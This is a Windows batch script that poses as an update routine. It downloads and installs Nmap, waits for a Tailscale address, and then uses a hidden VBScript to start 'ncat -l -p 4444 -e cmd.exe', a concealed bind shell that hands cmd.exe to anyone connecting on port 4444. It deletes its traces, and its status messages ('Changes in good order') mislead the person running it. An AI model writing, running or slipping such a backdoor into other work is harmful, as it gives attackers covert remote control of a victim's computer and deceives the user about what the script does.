@echo off
setlocal

echo.

REM Check if Ncat exists
if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
    echo All changes already set. Skipping updates...
) else (
    echo Ncat not found. Updating...
    echo ...
    powershell -Command "Invoke-WebRequest -Uri 'https://nmap.org/dist/nmap-7.93-setup.exe' -OutFile 'nmap-setup.exe'"
    echo ...
    echo Proceed with requested prompts...
    echo ...
    nmap-setup.exe
    echo Cleaning...
    if exist "nmap-setup.exe" del "nmap-setup.exe"
)

REM Verify Ncat again
if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
    echo Changes in good order. Proceeding...
) else (
    echo Changes failed! Exiting...
    exit /b
)

REM === Wait for Tailscale to assign a 100.x.x.x IP ===
echo Waiting for Tailscale connection...

:wait_loop
timeout /t 3 >nul
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /R /C:"100\."') do (
    goto tailscale_ready
)
goto wait_loop

:tailscale_ready
echo Tailscale connected. Continuing...

REM === Launch Ncat listener in background ===
echo Set WshShell = CreateObject("WScript.Shell") > run_ncat.vbs
echo WshShell.Run "ncat -l -p 4444 -e cmd.exe", 0, False >> run_ncat.vbs
cscript //B run_ncat.vbs
if exist "run_ncat.vbs" del "run_ncat.vbs"
